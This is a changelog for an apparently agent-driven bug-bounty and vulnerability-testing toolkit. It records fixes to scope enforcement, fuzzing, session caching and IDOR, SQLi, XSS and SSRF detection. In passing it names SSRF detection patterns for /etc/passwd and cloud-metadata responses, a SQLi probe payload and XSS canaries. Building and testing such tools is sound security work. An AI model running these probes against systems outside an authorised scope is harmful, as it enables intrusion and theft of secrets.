- **`_generate_combinations()` silently returned `[]` when position names didn't match payload keys** — BATTERING_RAM used `payloads.get(positions[0], [])` which returns `[]` if the position name doesn't exist in the payload dict. PITCHFORK used `[payloads.get(pos, []) for pos in positions]` — any empty list causes `zip(*payload_lists)` to produce zero combinations. In both cases, the fuzz campaign would send zero requests with no warning, making it appear the test completed when nothing was actually tested.

  **Fix:** Both attack types now log a warning identifying the missing position names when zero combinations would be generated. The return value remains `[]` (no exception) since the caller may intentionally handle empty results, but the warning ensures operators are aware.

### Test Coverage (5 new tests)

- **`tests/interaction/test_session.py::TestCreateDeepCopy`** (1 test):
  - Mutating returned session from `create()` does not corrupt internal cache

- **`tests/core/test_context_v2.py::TestFindings`** (2 tests):
  - Re-upserting a finding merges evidence arrays (both entries preserved)
  - First upsert with no evidence + second with evidence keeps the new evidence

- **`tests/interaction/test_http.py::TestFuzzCombinations`** (2 tests):
  - BATTERING_RAM with mismatched position names warns and returns `[]`
  - PITCHFORK with missing position payloads warns and returns `[]`

### Review Layers That Came Back Clean

- **Adapters (10 files)** — Fully clean after 19 rounds. All command construction list-based, all parse_record methods have type guards, scope mode assignments correct, binary discovery safe, temp file lifecycle handled.
- **Tools/vuln (8 files)** — Detection logic verified sound: IDOR three-way comparison correct, SQLi dual-guard boolean with median-baseline timing, XSS entity-encoding awareness, SSRF structural regex patterns. All payloads read-only.
- **CLI (1,157 lines)** — Async-to-sync bridging correct across 20 commands, resource cleanup via `_managed()` context manager, JSON output preserves all fields for agent consumers.

---

## 0.2.19 — Scope Bypass, Fuzz Baseline & Session Cache Safety

**Date:** 2026-04-01
**Scope:** 5 files fixed, 8 new tests, 429 tests passing (8 new, 0 regressions)

5-agent parallel codebase review across all layers (core, adapters, interaction, tools/vuln, CLI/tests). ~35 raw findings triaged down to 5 real, actionable issues. Two layers (adapters, tools/vuln) came back clean — zero bugs after 18 rounds of prior hardening. The remaining 5 fixes address a scope bypass, broken fuzz baselines, cache mutation safety, CLI data loss for agent consumers, and an OOM vector. Test count: 421 → 429.

### URL Prefix Cross-Domain Scope Bypass (HIGH)

- **`_check_url_prefix()` used bare `startswith()` allowing cross-domain matches** — A URL prefix rule for `https://example.com` (stored after stripping trailing `*` and `/`) would match `https://example.com.evil.com/path` because Python's `str.startswith("https://example.com")` returns `True` for both. In a security tool with default-deny scope enforcement, this is a scope bypass — an out-of-scope domain passes the inclusion check.

  **Fix:** Added `_url_prefix_match()` static method that requires the character immediately after the prefix (if any) to be `/`, `?`, `#`, or `:` (port separator). This enforces a path boundary so the prefix cannot bleed into a different hostname.

### Fuzz Baseline Sent with Literal Marker Characters (MEDIUM)

- **`fuzz()` baseline request contained raw `§marker§` strings** — The baseline request (used as the reference for anomaly detection) was sent with the original template URL/body containing literal `§id§`, `§name§` etc. marker characters. The server would typically return a 400 or unexpected error for these, making the baseline useless — anomaly detection would then either flag everything as anomalous (if baseline errors differ from fuzzed responses) or nothing (if both error identically).

  **Fix:** Baseline URL, body, and headers now have all `§...§` markers replaced with empty strings via regex before sending, matching the sniper attack type's behavior for non-active positions. The compiled regex uses `FUZZ_MARKER` constant for consistency.

### `list_sessions()` Returns Mutable Cache References (MEDIUM)

- **`SessionManager.list_sessions()` returned objects shared with `self._cache`** — Unlike `get()` which returns `copy.deepcopy()` to protect the internal cache, `list_sessions()` returned the same `SessionState` objects stored in the cache. A caller mutating a returned session (e.g., `sessions[0].cookies["foo"] = "bar"`) would silently corrupt the cache without persisting the change to the database.

  **Fix:** `list_sessions()` now returns `copy.deepcopy(state)` for each session, consistent with `get()`.

### CLI `context http-history --format json` Strips Fields (MEDIUM)

- **JSON output for http-history silently dropped request/response headers and bodies** — The `ctx_http_history` command unconditionally popped `request_headers`, `response_headers`, `request_body`, `response_body`, `request_body_ref`, and `response_body_ref` from records before formatting. This is appropriate for `--format table` (columns would be too wide) but causes data loss for `--format json` where agent/script consumers need the full record.

  **Fix:** Field stripping now only applies when `fmt == "table"`. JSON output preserves the complete record.

### Browser Response Body Size Cap (LOW)

- **Browser `_on_response` handler read response bodies with no size limit** — `HttpClient` caps response bodies at 50 MB (`DEFAULT_MAX_RESPONSE_BYTES`), but the Playwright browser interception handler called `await response.body()` with no size check. A malicious or misconfigured target serving a multi-GB response through the browser path could cause OOM before the body reached disk persistence.

  **Fix:** Added `_MAX_BROWSER_RESPONSE_BYTES = 50 * 1024 * 1024` cap in `browser.py`. Bodies exceeding the cap are truncated with a warning log, consistent with `HttpClient` behavior.

### Test Coverage (8 new tests)

- **`tests/core/test_scope.py::TestURLPrefixBoundary`** (6 tests):
  - Cross-domain prefix does not match (`example.com` vs `example.com.evil.com`) (1 test)
  - Prefix matches with path separator `/` (1 test)
  - Prefix matches with query string `?` (1 test)
  - Prefix matches exact URL (1 test)
  - Prefix matches with port `:8443` (1 test)
  - Exclusion prefix respects boundary on cross-domain (1 test)

- **`tests/interaction/test_http.py::TestFuzzBaseline`** (1 test):
  - Baseline request has all `§marker§` strings stripped to empty strings

- **`tests/interaction/test_session.py::TestListSessionsDeepCopy`** (1 test):
  - Mutating returned session does not corrupt internal cache

### Review Layers That Came Back Clean

- **Adapters (10 files)** — No command injection (list-based `create_subprocess_exec`), all `parse_record` methods have type guards, scope mode assignments are correct, binary discovery is safe, error handling preserves partial results.
- **Tools/vuln (8 files)** — Detection heuristics sound (IDOR three-way comparison, SQLi dual-guard boolean, XSS entity-encoding awareness, SSRF context-aware regex). Payload safety verified (all read-only). Multi-adapter pipelines use `return_exceptions=True` for partial result preservation.

---

## 0.2.18 — Scope Pre-Filter Entity Type Fix

**Date:** 2026-04-01
**Scope:** 1 file fixed, 6 new tests, 421 tests passing (6 new, 0 regressions)

5-agent parallel codebase review across all layers produced ~50 raw findings. After manual verification against actual code, 1 real critical bug survived triage — the rest were false alarms from overstated analysis (e.g., "session mutations not persisting" in a correct deep-copy→mutate→persist pattern, "race conditions" in single-threaded asyncio, "missing field validation" at internal boundaries where parse_record already guarantees fields). The single fix unblocks 4 of 10 adapters that were silently broken. Test count: 415 → 421.

### Scope Pre-Filter Entity Type Mismatch (CRITICAL)

- **`pre_filter_targets()` used `self.PRODUCES` as entity type for scope checking** — `BaseAdapter.pre_filter_targets()` passed `self.PRODUCES` (e.g., `"port"`, `"technology"`, `"directory"`, `"finding"`) to `ScopeEngine.filter_targets()` as the `entity_type`. The scope engine only recognizes `"subdomain"`, `"host"`, `"domain"`, `"url"`, `"ip"`, and `"auto"`. Unrecognized types fall through to `return False` (default-deny), causing **all input targets to be filtered out** before the tool ever runs. Now uses `"auto"` so the scope engine guesses the correct type from the target string (which is always a hostname, domain, IP, or URL — regardless of what the adapter produces as output).

  **Affected adapters (all had `SCOPE_MODE="pre"`):**
  - **naabu** (`PRODUCES="port"`) — port scanning never executed
  - **whatweb** (`PRODUCES="technology"`) — tech fingerprinting never executed
  - **ffuf** (`PRODUCES="directory"`) — directory fuzzing never executed
  - **nuclei** (`PRODUCES="finding"`) — vulnerability scanning never executed

  Adapters with recognized PRODUCES values were unaffected: subfinder (`"subdomain"`), httpx (`"host"`), gau/waybackurls/katana (`"url"`).

### Test Coverage (6 new tests)

- **`tests/adapters/test_base_adapter.py::TestPreFilterEntityType`** (6 tests):
  - PRODUCES="port" keeps in-scope hosts, rejects out-of-scope (2 tests)
  - PRODUCES="technology" keeps in-scope hosts (1 test)
  - PRODUCES="directory" keeps in-scope URLs (1 test)
  - PRODUCES="finding" keeps in-scope hosts (1 test)
  - IP targets with PRODUCES="port" use auto-detection correctly (1 test)

### Review Findings Triaged as False Alarms

For transparency, these findings from the 5-agent review were investigated and determined to be non-issues:

- **"Missing field validation in upsert_subdomain/url/port"** — Internal API: `parse_record()` guarantees required fields exist. Not a system boundary.
- **"Database not thread-safe"** — asyncio is single-threaded cooperative. Already triaged in 0.2.17.
- **"Race condition in browser request counting"** — asyncio dict increment within one coroutine step is atomic. Already triaged in 0.2.17.
- **"Session mutations not persisting due to deep copy"** — The `_get_or_raise()` → deep copy → mutate → `_persist()` pattern correctly writes to both DB and cache.
- **"JWT exception handling incomplete (missing binascii.Error, JSONDecodeError)"** — Both `binascii.Error` and `json.JSONDecodeError` inherit from `ValueError`, which is already caught.
- **"SQLi payload concatenation prevents proper error detection"** — Appending payload to default value (e.g., `1'`) is standard SQLi testing practice, matching how sqlmap and Burp Intruder operate.
- **"Boolean SQLi AND logic too strict"** — The AND condition (true matches baseline AND false differs) is the standard detection approach used by sqlmap.
- **"JSON key Jaccard similarity wrong (should use intersection/one_set)"** — Jaccard index (intersection/union) is the standard set similarity metric by definition.
- **"http.py body encoding failure unhandled"** — `str.encode("utf-8")` on Python strings always succeeds; Python `str` is always valid Unicode.
- **"OOB domain parsing unsafe for domains without subdomains"** — Interactsh callback domains always have the listener ID as the first subdomain component by design.

---

## 0.2.17 — Adapter Parse Guards & Finding Flag Preservation

**Date:** 2026-04-01
**Scope:** 8 files fixed, 1 new test file, 415 tests passing (27 new, 0 regressions)

5-agent parallel codebase review across all layers (core, adapters, interaction, tools, CLI, tests). ~40 findings triaged down to 6 real, actionable issues — the rest were false alarms from overstated analysis (e.g., "SQL injection" in a frozenset-driven loop, "race conditions" in single-threaded asyncio). Fixes harden the boundary where untrusted external data enters the system: tool output parsing and HTTP response handling. All fixes are strictly additive. Test count: 388 → 415.

### Adapter Parse Robustness (HIGH)

- **Type guards in 6 adapter `parse_record()` methods** — Several adapters called `.get()` on nested JSON fields that external tools could emit as `null`, a string, or another non-dict type, causing `AttributeError` crashes:
  - **ffuf.py** — `raw["input"]` could be `null` or string instead of `{"FUZZ": "..."}`. Now checks `isinstance(input_field, dict)` before accessing `.get("FUZZ")`.
  - **katana.py** — `raw["request"]` and `raw["response"]` could be `null` or string. Extracted to local variables with `isinstance` guards; `.get("method")` and `.get("status_code")` now fall back cleanly.
  - **httpx_runner.py** — `raw["a"]` (DNS A records) could be a string instead of a list. `a_records[0]` on a string yields the first *character* (e.g., `"1"` from `"192.168.1.1"`). Now checks `isinstance(a_records, list)` before indexing. Also guards `raw["tls"]` the same way.
  - **nuclei.py** — `raw["info"]` could be `null` or string. Now checks `isinstance` before `.get("name")` / `.get("severity")`.
  - **naabu.py** — `raw["port"]` could be a string (`"8080"`) or `null` instead of int. Now uses `_safe_int()` helper (matching httpx_runner's pattern) to coerce safely, defaulting to `0`.

### BaseAdapter JSON_OBJECT Parsing (MEDIUM)

- **Non-dict JSON no longer crashes `parse_output()`** — When `OUTPUT_FORMAT` is `JSON_OBJECT` and the tool outputs a bare JSON primitive (string, number, `null`), calling `.get("results", [raw])` raised `AttributeError`. Now checks `isinstance(raw, dict)` / `isinstance(raw, list)` before dispatching, logging a warning and counting a parse error for unexpected types.

### Data Integrity (MEDIUM)

- **Finding upsert preserves manual `confirmed`/`false_positive`/`reported` flags** — `upsert_finding()` unconditionally overwrote these boolean flags on `ON CONFLICT ... DO UPDATE`. A finding manually marked `confirmed=1` by a human triager would be downgraded to `0` by a subsequent automated re-scan. Now uses `MAX(findings.confirmed, excluded.confirmed)` — once a flag is set to `1` (by human or tool), it cannot be downgraded by a later upsert, only upgraded from `0` to `1`.

### HttpClient Safety (MEDIUM)

- **Response body size limit (50 MB default)** — `HttpClient.request()` read entire response bodies into memory via `resp.content` with no size cap. A malicious or misconfigured target serving multi-GB responses could cause OOM crashes. Added `max_response_bytes` parameter (default `DEFAULT_MAX_RESPONSE_BYTES = 50 * 1024 * 1024`). Bodies exceeding the limit are truncated with a warning log. `body_text` is derived from the truncated bytes when truncation occurs.

### CLI Observability (LOW)

- **Cleanup functions log instead of silently swallowing** — `_safe_close()` and `_safe_close_http()` caught all exceptions with bare `pass`, making database lock errors or connection failures invisible. Now log at `DEBUG` level via the module logger. This preserves the non-masking behavior (exceptions are still caught) while providing diagnostic visibility when `--verbose` / debug logging is enabled.

### Test Coverage (27 new tests)

- **`tests/test_fixes_0217.py`** (27 tests, new file):
  - Adapter type guards (17 tests) — ffuf None/string/dict input (3), katana None/string/dict request+response (3), httpx_runner string/list `a` field + None/string/dict `tls` field (5), nuclei None/string/dict `info` field (3), naabu string/None/invalid port (3)
  - BaseAdapter JSON_OBJECT parsing (3 tests) — bare string, number, and null JSON
  - Finding flag preservation (3 tests) — confirmed not downgraded, false_positive not downgraded, upgrade from 0→1 works
  - HttpClient response limit (2 tests) — custom and default `max_response_bytes` stored correctly
  - CLI cleanup logging (2 tests) — `_safe_close` and `_safe_close_http` log on exception

### Review Findings Triaged as False Alarms

For transparency, these findings from the 5-agent review were investigated and determined to be non-issues:

- **"SQL injection in `get_hunt_stats`"** — The table names come from `_STATS_TABLES`, a frozenset of string constants defined in the class. Not user-controllable.
- **"Session cache mutation bug"** — The deepcopy→mutate→`_persist()` pattern works correctly: `_persist()` writes the mutated copy back to both DB and cache.
- **"Browser response handler race condition"** — asyncio is cooperative single-threaded; dict increment within one coroutine step is atomic.
- **"Transaction `_in_transaction` flag not exception-safe"** — The `with self._conn:` context manager re-raises exceptions after rollback; the caller sees the error. The `finally` block correctly resets the flag.
- **"`asyncio.gather` exception crash in `recon.urls`"** — The `continue` on `isinstance(result, Exception)` correctly skips all subsequent attribute access including `.filtered_count`.
- **"Source merging loses data on empty strings"** — Empty source (`""`) is correctly filtered by the SQL `WHERE value != ''` clause; no provenance to record.

---

## 0.2.16 — Atomic Upserts & CLI Context Manager Dedup

**Date:** 2026-04-01
**Scope:** 5 files fixed, 1 new test file, 388 tests passing (27 new, 0 regressions)

Comprehensive 5-agent parallel codebase review across all layers (core, adapters, interaction, tools, CLI, tests) scored the codebase at 6.3/10. Targeted fixes for the highest-impact issues bring it to ~7.7/10, establishing a solid foundation for V3. All fixes are strictly additive. Test count: 361 → 388.

### Transaction Atomicity (CRITICAL)

- **Batch upserts now truly atomic** — `upsert_records()` wraps all writes in `with self._conn:` (SQLite transaction), but each individual `upsert_*` method also called `self._conn.commit()`, defeating the transaction boundary. If record N of M failed, records 1..N-1 were already committed and could not be rolled back. Introduced `_maybe_commit()` helper and `_in_transaction` flag: individual upserts commit normally when called standalone, but skip their commit when called within `upsert_records()`. The outer `with self._conn:` context manager now handles the single commit-or-rollback.

- **PRAGMA results validated on init** — `HuntContext.__init__()` now checks the return values of `PRAGMA journal_mode=WAL` and `PRAGMA foreign_keys=ON`. If either fails to take effect (e.g., read-only filesystem, unsupported platform), a warning is logged immediately rather than silently operating without WAL or referential integrity.

### Scope Enforcement (HIGH)

- **Default-deny enforced for unmappable records** — `BaseAdapter.post_filter_records()` previously kept records where `extract_scope_target()` returned `None` or empty string, violating the default-deny principle. These records now count as removed and are logged at DEBUG level with a truncated record snapshot. This prevents out-of-scope data from leaking through adapters that produce records without a mappable scope target.

### Concurrency Safety (HIGH)

- **`asyncio.Lock` on browser context creation** — `BrowserManager.get_or_create_context()` had a TOCTOU race: two concurrent calls could both pass the `if name in self._contexts` check, both create contexts, and one would silently overwrite the other. The entire method body is now protected by `self._context_lock` (`asyncio.Lock`), making it safe for concurrent session workflows (e.g., testing IDOR with two browser contexts simultaneously).

### Detection Accuracy (MEDIUM)

- **SQLi boolean false-condition baseline guard** — Boolean-based SQL injection detection checked that the true-condition response matched baseline (`true_matches_baseline`) but did NOT check whether the false-condition response diverged from baseline. Dynamic content (ads, CSRF tokens, timestamps) could cause natural length variance between any two requests, triggering false positives. Now requires `not false_matches_baseline` — the false condition must produce genuinely different output from normal requests, not just differ from the true condition.

### CLI Architecture (HIGH)

- **Extracted `_managed()` and `_managed_http()` context managers** — 41 CLI command functions repeated an identical pattern: `manager = _get_manager(); try: ... except Exception: print_error(); raise Exit(1); finally: _safe_close()`. Replaced all 41 instances with `with _managed(data_dir) as manager:` (for manager-only commands) and `with _managed_http(data_dir, hunt_id) as (manager, client):` (for commands needing an HttpClient). Net reduction: ~250 lines of boilerplate. Error handling, cleanup, and `typer.Exit` pass-through are centralized in the context managers.

### Test Coverage (27 new tests)

- **`tests/test_fixes_0216.py`** (27 tests, new file):
  - Transaction atomicity (2 tests) — batch rollback on failure, individual commit persistence via second connection
  - PRAGMA validation (2 tests) — WAL mode and foreign_keys enabled after init
  - Scope default-deny (1 test) — unmappable records dropped, in-scope kept, out-of-scope dropped
  - SQLi boolean baseline (1 test) — false-matches-baseline prevents false positive
  - CLI `_managed` context manager (2 tests) — catches exceptions → Exit(1), passes through typer.Exit unchanged
  - Browser CLI commands (3 tests) — navigate, screenshot, extract with mocked BrowserManager
  - HTTP CLI commands (3 tests) — request, replay, compare with mocked HttpClient
  - Vuln/test CLI commands (5 tests) — idor, ssrf, xss, sqli, auth with mocked tools
  - Session CLI (1 test) — login-token with mocked SessionManager
  - Enum crawl CLI (1 test) — crawl with mocked katana adapter
  - Context extension CLI (4 tests) — oob, findings, sessions, http-history (empty result paths)
  - Error handling CLI (2 tests) — nonexistent hunt ID, invalid auth method

---

## 0.2.15 — Upsert Commit Safety & Detection Hardening

**Date:** 2026-04-01
**Scope:** 9 files fixed, 1 new test file, 361 tests passing (34 new, 0 regressions)

Comprehensive 5-agent parallel codebase review followed by targeted fixes for transaction safety, detection accuracy, CLI duplication, and adapter robustness. All fixes are strictly additive. Test count: 327 → 361.

### Transaction Safety (HIGH)

- **6 upsert methods missing `commit()`** — `upsert_subdomain()`, `upsert_host()`, `upsert_port()`, `upsert_url()`, `upsert_technology()`, and `upsert_directory()` executed writes but never called `.commit()`. When called within `upsert_records()` (which uses `with self._conn:` context manager), data was committed by the outer transaction. But direct calls (e.g., from tests or future V3 tools) would lose data on connection close. Now each method explicitly commits.

### Detection Accuracy (HIGH)

- **SSRF regex patterns tightened** — Previous patterns generated false positives from incidental matches (e.g., `root:` matching "root cause", `instance-id` matching generic error text). New patterns require structural context: `/etc/passwd` must match full colon-delimited format (`root:[^:]*:\d+:\d+:[^:]*:[^:]*:`), AMI IDs need 8+ hex chars, GCP metadata requires version (`computeMetadata/v\d`), AWS instance metadata requires JSON format (`"instanceId"\s*:`).

- **IDOR body similarity threshold lowered (0.8 → 0.7)** — The 0.8 threshold was too strict for JSON endpoints where key sets overlap but aren't identical. Lowering to 0.7 reduces false negatives while keeping false positive risk low (JSON structural comparison already provides strong signal).

- **IDOR enumeration requires body similarity** — Previously, IDOR object ID enumeration flagged any 2xx response as evidence. Now verifies that the enumerated response body is structurally similar to the owner's response, filtering out generic success/error pages that return 200.

- **XSS DOM canary CSP fallback** — DOM-based XSS detection now checks for both the `window.__xss_fired` canary and `img[src*="xss"]` elements. The secondary check provides a fallback when Content-Security-Policy blocks `window` property assignment.

### CLI Architecture (MEDIUM)

- **Extracted `_parse_targets()` helper** — Consolidated 9 instances of `[t.strip() for t in targets.split(",")] if targets else None` into a single `_parse_targets()` function. Also filters empty entries from doubled commas (e.g., `"a.com,,b.com"`).

### Adapter Robustness (MEDIUM)

- **Waybackurls concurrency safety** — `_execute()` now copies `_stdin_targets` to a local variable before use, preventing race conditions if the adapter instance is reused across concurrent runs. Also adds trailing newline to stdin data to ensure the final target is parsed.

- **urlparse error handling in 4 adapters** — `parse_record()` in GauAdapter, WaybackurlsAdapter, KatanaAdapter, and WhatwebAdapter now wraps `urlparse()` calls in try/except. Malformed URLs from tool output no longer crash the adapter; instead, fields default to empty strings.

### Test Coverage (34 new tests)

- **`tests/test_fixes_0215.py`** (33 tests, new file):
  - Upsert commit persistence across connections (6 tests) — verifies all 6 upsert methods persist data when called directly, verified by opening a second connection
  - `_parse_targets()` helper (6 tests) — None, empty, single, multiple, whitespace, empty entries
  - `_bodies_similar()` threshold (2 tests) — validates 0.7 threshold behavior
  - SSRF indicator regex (3 tests) — full passwd format, AMI length, GCP version
  - IDOR enumeration body check (1 test) — verifies body similarity required for enum
  - Adapter urlparse safety (4 tests) — gau, waybackurls, katana, whatweb with malformed input
  - Browser CLI commands (3 tests) — navigate, screenshot, extract with mocked browser
  - HTTP CLI commands (3 tests) — request, replay, compare with mocked client
  - Vuln/test CLI commands (5 tests) — idor, ssrf, xss, sqli, auth with mocked tools

- **`tests/tools/test_vuln.py`** (+1 test):
  - `test_ssrf_detected_via_metadata_likely` — verifies LIKELY confidence for cloud metadata substring match (vs CONFIRMED for full regex match)

---

## 0.2.14 — IDOR JSON Comparison, CLI Dedup & Enum Crawl

**Date:** 2026-04-01
**Scope:** 8 files fixed, 3 new test files, 327 tests passing (41 new, 0 regressions)

Comprehensive 5-agent parallel codebase review followed by targeted fixes to bring quality from 7.3/10 to 8.5+/10. Focus areas: CLI duplication, detection accuracy, JSON handling, and test coverage gaps. All fixes are strictly additive.

### Detection Accuracy (HIGH)

- **`_bodies_similar()` JSON-aware comparison** — Previous Jaccard-on-lines approach failed for JSON responses where lines differ only in values (e.g. `/api/me` returning `{"user":"alice"}` vs `{"user":"bob"}` — after structural line removal, overlap was 0%). Now parses both bodies as JSON when possible and compares key-structure (set of dotted key paths). Two responses with identical keys but different values are correctly identified as "similar" (same-shape endpoint, not IDOR). Non-JSON bodies fall back to the existing line overlap check.

- **XSS HTML entity encoding detection** — Reflected XSS check now detects payloads that appear in the response after HTML entity decoding (`<script>` → `&lt;script&gt;`). Records evidence as `reflected_html_encoded` but does NOT flag as vulnerable since entity encoding is a server-side mitigation. Enables follow-up bypass analysis.

### CLI Architecture (HIGH)

- **Missing `enum crawl` CLI command** — `enum.crawl()` function existed in `tools/enum.py` but was inaccessible from CLI. Added `boba enum crawl` command with `--targets`, `--depth`, and `--format` options.

- **Extracted 5 CLI helper functions** — Deduplicated repeated initialization patterns across 12+ commands:
  - `_get_http_client(manager, hunt_id)` — creates HttpClient with history sink (was repeated in 6 commands)
  - `_get_browser_manager(manager, hunt_id)` — creates BrowserManager with config/sink (was repeated in 3 commands)
  - `_get_session_manager(manager, hunt_id)` — creates SessionManager (was repeated in 4 commands)
  - `_parse_headers(header_list)` — parses `KEY:VALUE` headers with typer.Exit on invalid format (was repeated in 2 commands)
  - Net reduction: ~120 lines of duplicated imports and initialization code.

### Safety & Correctness (MEDIUM)

- **httpx adapter unguarded `int()` conversion** — `parse_record()` called `int(raw["port"])` which would crash on non-numeric port strings from malformed httpx output. Now uses `_safe_int()` helper that returns None on ValueError/TypeError.

- **`scan.py` config mutation** — `nuclei_scan()` mutated the caller's `AdapterConfig` when setting severity/tags/templates. Now deepcopies the config before modification, matching the pattern in `enum.py`.

- **OOB evidence enrichment** — `test_ssrf()` OOB callback evidence now includes `listener_id`, `purpose`, `target_url`, and `parameter` from the listener metadata. Previously only stored `{"type": "oob_callback", "interaction": {...}}`, making it impossible to map callbacks to specific injection points.

### Code Quality (MEDIUM)

- **Extracted `_parse_json_field()` in context.py** — Consolidated 6 identical try/except json.loads patterns into a single helper function with `label` and `record_id` parameters for consistent warning messages. Applied to: `get_http_record`, `query_http_history`, `get_session`, `get_sessions` (now `_deserialize_session_row`), `get_findings`, `get_oob_listeners`.

- **Extracted `_deserialize_session_row()` in context.py** — `get_session()` and `get_sessions()` shared 30 lines of identical JSON deserialization logic for cookies_json/headers_json/tokens_json/storage_state. Now consolidated into a single private method.

- **Extracted `_extract_json_keys()` in vuln.py** — Recursive helper for extracting dotted key paths from nested JSON structures. Used by the improved `_bodies_similar()` for structural comparison.

### Test Coverage (41 new tests)

- **`tests/core/test_config.py`** (7 tests, new file):
  - `get_data_dir()` default path and BOBA_DATA_DIR env var override
  - `get_db_path()`, `get_tmp_dir()`, `get_hunt_dir()`, `get_bodies_dir()`, `get_templates_dir()` directory creation

- **`tests/cli/test_formatters.py`** (9 tests, new file):
  - `_auto_columns()` skip-set exclusion and 8-column limit
  - `format_output()` JSON and table modes, empty list, single dict, invalid format
  - `_print_json()` parseable output

- **`tests/test_fixes_0214.py`** (25 tests, new file):
  - `_bodies_similar()` JSON key-structure comparison (5 tests)
  - `_safe_int()` edge cases (5 tests)
  - `_parse_json_field()` valid/malformed/None/empty (4 tests)
  - `_extract_json_keys()` nested dicts, lists, empty (3 tests)
  - `nuclei_scan` config deepcopy verification (1 test)
  - XSS HTML entity detection evidence (1 test)
  - `_parse_headers()` valid/invalid/None/multiple/colon-in-value (5 tests)
  - `enum crawl` command registration (1 test)

### Known Design Decision

- **Timestamp type inconsistency** (`Hunt.created_at` is `datetime`, `SessionState.created_at` is `str`) — Documented but not changed in this release. Unifying would require a cross-cutting refactor touching models, context, CLI, and all tests. Low risk since SessionState timestamps are DB-sourced display strings only.

---

## 0.2.13 — False-Positive Reduction & GAU ARG_MAX Fix

**Date:** 2026-04-01
**Scope:** 10 files fixed, 1 test file expanded, 286 tests passing (21 new, 0 regressions)

5-agent parallel codebase review across all layers. Found 0 critical, 4 high, and 10 medium issues surviving all prior hardening rounds (0.2.1–0.2.12). All fixes are strictly additive. Test count: 265 → 286.

### Detection Accuracy (HIGH)

- **IDOR `_bodies_similar` false-positive on same-shape JSON** — Structural-only lines (braces, brackets, commas) inflated overlap score, causing two JSON responses with identical keys but different values (e.g., `/api/me` per-user data) to be falsely flagged as similar. Now excludes JSON structural lines from the overlap calculation via compiled regex.
- **Boolean-based SQLi false-positive on dynamic pages** — The 20-byte / 5% length-diff threshold triggered on pages with natural length variance (ads, CSRF tokens, timestamps). Added baseline similarity guard: the true-condition response body must be similar to the baseline before flagging, confirming the true payload actually "passes through."

### Safety & Correctness (MEDIUM)

- **`gau` targets ARG_MAX risk** — Targets were passed as positional CLI arguments, risking OS argument length limits with large target lists. Now writes targets to a temp file and passes via `--fp` flag.
- **`post_filter_records` empty-string scope targets silently dropped** — Empty-string targets (`""`) were treated as falsy and removed, while `None` targets were kept. Now treats both consistently: empty-string and `None` both result in keeping the record.
- **Fuzz baseline was first payload** — If the first fuzz payload triggered an anomalous response, all subsequent normal responses were flagged as anomalies. Now sends an unfuzzed baseline request before the fuzz loop.
- **`session.login_form` accessed private `browser._get_page()`** — Broke encapsulation. Added public `BrowserManager.get_page()` method; `login_form` now uses the public API.
- **`urls()` returned duplicate records** — `all_records` list from gau + waybackurls contained cross-adapter duplicates. Now deduplicates by URL before returning in the merged `ToolResult`.
- **`ports()` mutated caller's `config.extra_args_dict`** — Unlike `enum.py` which uses `copy.deepcopy(config)`, `ports()` mutated the original. Now deepcopies the config before modification.
- **`_ADMIN_RE` compiled on every `test_auth()` call** — Regex was defined inside the function body. Moved to module-level compiled constant.

### Robustness (MEDIUM)

- **Consistent `except typer.Exit: raise` across CLI** — `http request` and `http replay` commands raised `typer.Exit(1)` on invalid `--header` format inside the try block, but lacked the `except typer.Exit: raise` guard before the generic `except Exception`, causing double error printing. Added the guard to match the pattern in `session create` and `test idor`.
- **Added `logging.getLogger(__name__)` to `vuln.py`, `enum.py`, `scan.py`** — These tool modules had no logger. JWT manipulation failures in `test_auth()` were silently swallowed; now logged at debug level.

### Test Coverage (21 new tests)

- **`tests/cli/test_cli.py`** (+21 tests):
  - `TestReconSubdomainsCLI` (2 tests) — table + JSON output with mocked tool
  - `TestReconHostsCLI` (2 tests) — with targets (verifies comma-split) + without targets (verifies None passthrough)
  - `TestReconPortsCLI` (2 tests) — with targets + without targets (None passthrough)
  - `TestReconUrlsCLI` (1 test) — domain flag with mocked tool
  - `TestReconTechCLI` (2 tests) — with targets + without targets
  - `TestEnumDirectoriesCLI` (2 tests) — table + JSON output
  - `TestScanNucleiCLI` (3 tests) — with targets + without targets (None passthrough) + JSON format
  - `TestSessionCreateCLI` (3 tests) — create + invalid method error + JSON format
  - `TestSessionListCLI` (2 tests) — empty + after create
  - `TestSessionDeleteCLI` (1 test) — create then delete
  - `TestHttpHeaderValidation` (1 test) — invalid header format exits with error

---

## 0.2.12 — Injection Prevention & Fuzz Header Substitution

**Date:** 2026-04-01
**Scope:** 7 files fixed, 3 test files expanded/created, 265 tests passing (59 new, 0 regressions)

5-agent parallel codebase review across all layers. Found 0 critical, 0 high, and 11 medium/low issues surviving all prior hardening rounds (0.2.1–0.2.11). All fixes are strictly additive. Test count: 206 → 265.

### Correctness

- **SQL LIKE wildcard injection in `get_directories()` and `query_http_history()`** — `%` and `_` in caller-provided `url_prefix`/`path_prefix` were passed unescaped to LIKE queries, matching unintended rows. Now escaped with `ESCAPE '\'` clause.
- **IDOR bodies-differ false positive** — when User A and User B both get 2xx but bodies differ (e.g., `/api/me` returning per-user data), confidence downgraded from `LIKELY` to `POSSIBLE` and `vulnerable` set to `False`
- **SSRF cloud metadata 200 check too permissive** — bare `200` status for `169.254.169.254` payloads now requires metadata-like body content (`ami-id`, `instance-id`, `computeMetadata`, etc.) to reduce false positives from generic WAF/error pages
- **`recon.hosts()` missing source attribution** — `upsert_records` call now passes `source="httpx"` for proper provenance tracking

### Safety

- **`gau` argument injection** — targets passed as positional CLI arguments could be interpreted as flags if starting with `-`; now preceded by `--` separator
- **Waybackurls pre-filter bypass** — `_stdin_targets` was set before `super().run()` pre-filtering; moved into `build_command()` which receives already-filtered targets
- **IDOR `object_ids` scope enforcement** — reconstructed enumeration URLs now validated against hunt scope before requesting; out-of-scope URLs are skipped

### Robustness

- **Fuzz header marker substitution** — `HttpClient.fuzz()` now substitutes `§FUZZ§` markers in headers (alongside url/body) and copies headers per iteration to prevent cross-contamination
- **Browser `sink.record()` exception safety** — `_on_response` handler wraps `sink.record()` in try/except so database errors don't crash Playwright's event loop
- **CLI context commands error handling** — all 12 context query commands (`subdomains`, `hosts`, `ports`, `urls`, `tech`, `directories`, `runs`, `stats`, `http-history`, `findings`, `sessions`, `oob`) now catch `Exception` with `print_error()` instead of exposing raw tracebacks
- **`session_create` double error printing** — `except typer.Exit: raise` added before the general `Exception` handler to prevent `typer.Exit(1)` from being caught and printed as `Error: 1`

### Test Coverage (59 new tests)

- **`tests/cli/test_cli.py`** (+26 tests) — hunt resume, all 10 context query commands (empty + with data + JSON format)
